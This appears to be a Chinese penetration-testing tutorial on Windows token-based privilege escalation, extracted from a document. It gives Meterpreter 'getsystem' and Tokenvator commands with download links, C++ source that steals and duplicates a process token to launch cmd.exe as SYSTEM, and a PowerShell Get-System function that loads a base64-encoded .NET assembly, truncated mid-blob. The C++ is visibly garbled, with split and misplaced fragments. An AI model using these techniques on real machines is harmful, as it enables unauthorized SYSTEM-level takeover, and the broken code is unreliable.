稳住，我们需要外力的借助，来一波信息差的弥补。
没有上下文的支撑，你我他全部凉凉，且看我如何解决掉信息差这个问题的。
实话跟你们说，在接触提权时，我第一次看见token，system 等术语。
首先，推荐信息收集平台：wiki，我在wiki
中输入token，进一步在文末发现了引用文章。 它指引我来到了，Windows
开发人员中心，初看一眼，酷。得到参考资料：access token（访问令牌）
Windows
开发人员中心，这是我推荐的第二个信息收集平台。这帮助我们从函数到术语都铺好了信息之路。
因为底层代码对于我们来说，遥不可及却又触手可得，借助此手册，我们一眼就可以发现最关键的地方，从而具备
阅读大牛写的攻略的能力。只要读得明白别人写的什么意思，那么你的潜力将会无穷大。
阅读完以上推荐后，您将具备以下知识，至少您会懂得怎么去查，释放大脑的记忆：
sid，gid 这是用户和用户组的标志符。操作token 的函数，结构体，枚举类型。
有了这些基础以后，我们可以进一步去阅读核心代码，感觉就像和是看英语单词一样。
然后，也是最后的大家都清楚的一个平台，也不需要我推荐了：github
当您在学习的过程中遇到以下陌生术语时，请优先阅读参考资料：从零开始内网渗透学习
-   active directory(AD 域，活动目录，域)
-   krbtgt
    账号，你建立了域集中管理一批机器，客户端要接入工作肯定就要账号密码认证
-   通道代理等其他渗透步骤内容这些就不再这里醍醐灌顶了，这里就谈提权相关术语吧
-   这里介绍一个命令：whoami /? 掌握每个命令的帮助手册是最重要的依靠，
    根据帮助每一个命令敲一下你就懂了。
-   其他cmd 命令你复现不出来，几乎可以确定你用的是windows7 或者
    10，其实肯定命令默认是在服务器上面运行的。
参 考 资 料 ： access token：https://docs.microsoft.com/zh-
cn/windows/win32/secauthz/access-tokens 从零开始内网渗透学习：
https://github.com/l3m0n/pentest_study
####### token_privEsc
工具地址：https://github.com/sailay1996/tokenx_privEsc 配合metasploit
实现 使用metasploit 的扩展模块meterpreter meterpreter\> getsystem
离开metasploit
如果您对meterpreter 较为模糊，建议回头学习一下metasploit
部分，这里推荐参考资料：渗透攻防工具篇-后渗透阶段的Meterpreter
也就是说通过漏洞，有效载荷等步骤以后直接到了meterpreter
部分，这是进入了别人的shell
部分了。你要得到系统权限，直接运行getsystem，喝杯咖啡静候佳音就行了。
除了meterpreter 的getsystem 方式以外，还有别的吗？有，看下文。
> C:\\temp\> Tokenvator.exe getsystem cmd.exe
服务器上搜索一下Tokenvator.exe
搜不到说明这不是服务器版本系统本身附带的东西
既然服务器没有，它肯定就是提权相关的东西了。进一步搜索得到下载地
址。
Tokenvator.exe 下载地址 https://github.com/0xbadjuju/Tokenvator/releases
打开Tokenvator.exe 运行help 关闭
把Tokenvator.exe 文件放到C:\\temp 下进一步实验
> C:\\temp\> Tokenvator.exe getsystem cmd.exe
incognito.exe
也是工具，您能搞得定Tokenvator.exe，一定也会获取到ncognito.exe
的。getsystem.py 脚本同理。 是的，除了cmd.exe，其他exe
工具都需要你额外去下载。进一步发现文章的每一张图都代表着一个工具。
提及工具，这里还有一个，可自行尝试，请阅读参考资料：谷歌披露了影响所有Windows
版本的 20 年未修补漏洞 交互式CTF 探索工具 github 中点击版本，
releases，就可以进入对应的下载页面
参考资料： https://github.com/sailay1996/tokenx_privEsc
渗透攻防工具篇-后渗透阶段的Meterpreter：https://paper.seebug.org/29/
谷歌披露了影响所有Windows 版 本 的 20 年 未 修 补 漏 洞 ：
https://thehackernews.com/2019/08/ctfmon-windows-vulnerabilities.html
交互式CTF 探索工具：https://github.com/taviso/ctftool
####### 窃 取 Token To GetSystem：
https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-
Impersonation-Part1.html ![](media/image221.jpeg){width="1.0in"
height="1.0in"}
> #include \ #include \ using namespace std;
>
> HANDLE GetAccessToken(DWORD pid)
>
> {
>
> /\*Retrievesanaccesstokenforaprocess\*/
>
> HANDLE currentProcess = {}; HANDLE AccessToken = {}; DWORD LastError;
>
> if (pid == 0)
>
> {
>
> }
>
> else
>
> {
>
> UE, pid);
>
> currentProcess = GetCurrentProcess();
>
> currentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TR if
> (!currentProcess)
>
> {
>
> LastError = GetLastError();
>
> wprintf(L\"ERROR: OpenProcess(): %d\\n\", LastError); return
> (HANDLE)NULL;
>
> }
>
> }
>
> if (!OpenProcessToken(currentProcess, TOKEN_ASSIGN_PRIMARY \| TOKEN\_
> DUPLICATE \| TOKEN_IMPERSONATE \| TOKEN_QUERY, &AccessToken))
>
> {
>
> LastError = GetLastError();
>
> wprintf(L\"ERROR: OpenProcessToken(): %d\\n\", LastError); return
> (HANDLE)NULL;
>
> }
>
> return AccessToken;
>
> }
>
> int wmain(int argc, WCHAR \*\*argv)
>
> {
>
> DWORD LastError;
>
> /\*ArgumentCheck\*/
>
> if (argc \
> {
>
> wprintf(L\"Usage: %ls \\\n\", argv\[0\]); return 1;
>
> }
>
> /\*ProcessIDdefinition\*/
>
> DWORD pid;
>
> pid = \_wtoi(argv\[1\]);
>
> if ((pid == NULL) \|\| (pid == 0)) return 1; wprintf(L\"\[+\] Pid
> Chosen: %d\\n\", pid);
>
> //Retrievestheremoteprocesstoken.
>
> HANDLE pToken = GetAccessToken( pid);
>
> ation;
>
> //ThesearerequiredtocallDuplicateTokenEx.
>
> SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImperson
>
> TOKEN_TYPE tokenType = TokenPrimary; HANDLE pNewToken = new HANDLE;
>
> if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateL
>
> evel, tokenType, &pNewToken))
>
> {
>
> or);
>
> DWORD LastError = GetLastError();
>
> wprintf(L\"ERROR: Could not duplicate process token \[%d\]\\n\",
> LastErr
>
> return 1;
>
> }
>
> wprintf(L\"Process token has been duplicated.\\n\");
>
> if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateL
> evel, tokenType, &pNewToken))
>
> {
>
> or);
}
> DWORD LastError = GetLastError();
>
> wprintf(L\"ERROR: Could not duplicate process token \[%d\]\\n\",
> LastErr return 1;
>
> wprintf(L\"Process token has been duplicated.\\n\");
>
> /\*StartsanewprocesswithSYSTEMtoken\*/ STARTUPINFOW si = {};
> PROCESS_INFORMATION pi = {};
>
> BOOL ret;
>
> ret = CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_O NLY,
> L\"C:\\\\Windows\\\\System32\\\\cmd.exe\", NULL, CREATE_NEW_CONSOLE,
> NUL L, NULL, &si, &pi);
>
> if (!ret)
>
> {
>
> DWORD lastError; lastError = GetLastError();
>
> wprintf(L\"CreateProcessWithTokenW: %d\\n\", lastError); return 1;
>
> }
>
> }
以上是更改后的代码。
## Windows API 和模拟(T1134)
> function Get-System
>
> {
>
> if(\[System.Threading.Thread\]::CurrentThread.GetApartmentState() -ne
> \'STA\')
>
> {
>
> Write-Output \"This powershell shell is not in STA mode!\"; return ;
>
> }
>
> if(-not
> (\[System.Management.Automation.PSTypeName\]\"zc00l.ImpersonationTok
> en\").Type) {
>
> \[Reflection.Assembly\]::Load(\[Convert\]::FromBase64String(\"TVqQAAMAAAAEA
> AAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>
> AAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSByd
> W4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAGTDJOgAAAAAAAAAA
> OAAIiALATAAABYAAAAGAAAAAAAAtjQAAAAgAAAAQAAAAAAAEAAgAAAAAgAABA
> AAAAAAAAAGAAAAAAAAAACAAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAE
> AAAAAAAABAAAAAAAAAAAAAAAGE0AABPAAAAAEAAANgDAAAAAAAAAAAAAAAA
> AAAAAAAAAGAAAAwAAACoMwAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAA
> AAAAAAAC50ZXh0AAAAvBQAAAAgAAAAFgAAAAIAAAAAAAAAAAAAAAAAACAAAG
> AucnNyYwAAANgDAAAAQAAAAAQAAAAYAAAAAAAAAAAAAAAAAABAAABALnJlbG
> 9jAAAMAAAAAGAAAAACAAAAHAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAA
> AAAAAAAAACVNAAAAAAAAEgAAAACAAUAhCMAACQQAAABAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
> MwAwATAAAAAQAAEQADFgJvEAAACigCAAAGCisABioAEzADANAAAAACAAARABI
> B/hUEAAACKAgAAAYMCH4RAAAKKBIAAAoTBREFLAgWEwY4pQAAAAh+CQAABBI
> DKAQAAAYW/gETBxEHLAgWEwY4hwAAABQCEgEoAQAABhb+ARMIEQgsBRYTBit
> wEgn+FQYAAAISCReNAwAAAn0eAAAEEgl+HQAABH0cAAAEEgkXfRsAAAQRCRME
> EQR7HgAABBaPAwAAAgd9EQAABBEEex4AAAQWjwMAAAIYfRIAAAQJEgQSACgJA
> AAGFv4BEwoRCiwFFhMGKwUGEwYrABEGKhMwBgDGAAAAAwAAEQASAP4VBAAA
> AigIAAAGCwd+CQAABH4LAAAEYBICKAQAAAYW/gETBxEHLAgWEwg4kAAAABQC
> EgAoAQAABhb+ARMJEQksBRYTCCt5Egr+FQMAAAISCgZ9EQAABBIKGH0SAAAEE
>
> QoNEgv+FQUAAAISCxd9GQAABBILF40DAAACfRoAAAQRCxMEEQR7GgAABBYJpA
> MAAAISBf4VBQAAAggWEgQRBCgBAAArEgUSBigHAAAGFv4BEwwRDCwFFhMIKwU
> XEwgrABEIKgAAEzADAIMAAAAEAAARACAABAAAFwIoAgAABgoGfhEAAAooEgAACg
> 0JLAUWEwQrXgZ+CAAABH4HAAAEYBIBKAQAAAYW/gETBREFLAUWEwQrPRIC/h
> UVAAABBxgSAigFAAAGFv4BEwYRBiwFFhMEKx5+EQAACggoBgAABhb+ARMHEQcs
> BRYTBCsFFxMEKwARBCoiAigUAAAKACoTMAIAtgAAAAAAAAAgAAQAAIACAAAEGI
> ADAAAEIAAADwCABAAABCAAAAIAgAUAAAQXgAYAAAQYgAcAAAQagAgAAAQegAk
> AAAQfEIAKAAAEHyCACwAABB9AgAwAAAQggAAAAIANAAAEIAABAACADgAABH4F
> AAAEfgkAAARggA8AAAR+BAAABH4GAAAEYH4HAAAEYH4IAAAEYH4JAAAEYH4KA
> AAEYH4LAAAEYH4MAAAEYH4NAAAEYH4OAAAEYIAQAAAEKh4XgB0AAAQqAABC
> U0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAADQBQAAI34AAD
> wGAAC8BwAAI1N0cmluZ3MAAAAA+A0AAAQAAAAjVVMA/A0AABAAAAAjR1VJRAAA
> AAwOAAAYAgAAI0Jsb2IAAAAAAAAAAgAAAVc9AhQJCgAAAPoBMwAWAAABAAAAF
> gAAAAcAAAAsAAAADwAAAB4AAAAUAAAAEgAAAA8AAAAFAAAABAAAAAIAAAAIAA
> AAAQAAAAIAAAAFAAAAAQAAAAAANgUBAAAAAAAGAC4EfQYGAJsEfQYGAFMDSw
> YPAJ0GAAAGAHsDIAYGAAIEIAYGAOMDIAYGAIIEIAYGAE4EIAYGAGcEIAYGAJIDIAY
> GAGcDXgYGAEUDXgYGAMYDIAYGAK0D4QQGAH4HWAUKAHYHSwYGAAcDWAUG
> AB8EWAUGAF8FWAUGAEQGWAUGABAFXgYAAAAAAQAAAAAAAQABAAEAEACJB
> QoFQQABAAEACgEQADQBAABJABEADwAKARAAhAAAAEkAFwAPAAoBEAALAQAA
> SQAZAA8ACgEQAIoBAABJABsADwACAQAAHQcAAFEAHwAQAFGAzQHCABYA8QD
> FABYAKgDFABYAPwDFABYAFQDFABYA2wHFABYAnADFABYArADFABYADALFABY
> AiQDFABYAHAHFABYASAHFABYAmAHFABYAbQDFABYACgDFABYAXAHFAAYAgAL
> IAAYA6gbFAFaArQHFAFaAKgDFAFaAWADFAFaAbQHFAAYApgfFAAYAnQfCAAYAjgf
> CAAYQ3wbMAAYAjgfFAAYAUAXFABYA8AHFAAYQiwLMAAYGGALFAFaAGAXRAFa